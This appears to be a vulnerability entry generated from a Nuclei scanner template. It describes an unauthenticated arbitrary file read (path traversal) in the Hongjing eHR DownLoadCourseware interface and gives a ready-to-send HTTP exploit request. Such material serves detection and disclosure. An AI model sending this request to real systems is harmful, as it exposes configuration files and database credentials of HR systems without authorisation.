# Nuclei Template: Hongjing HCM - Local File Inclusion
**Template ID:** hjsoft-hcm-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`hjsoft-hcm-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file read vulnerability in the Hongjing eHR /DownLoadCourseware interface. Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.

## Steps to reproduce / Exploit Payload
```http
GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3DownLoadCourseware%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
- https://blog.csdn.net/qq_41904294/article/details/140180110
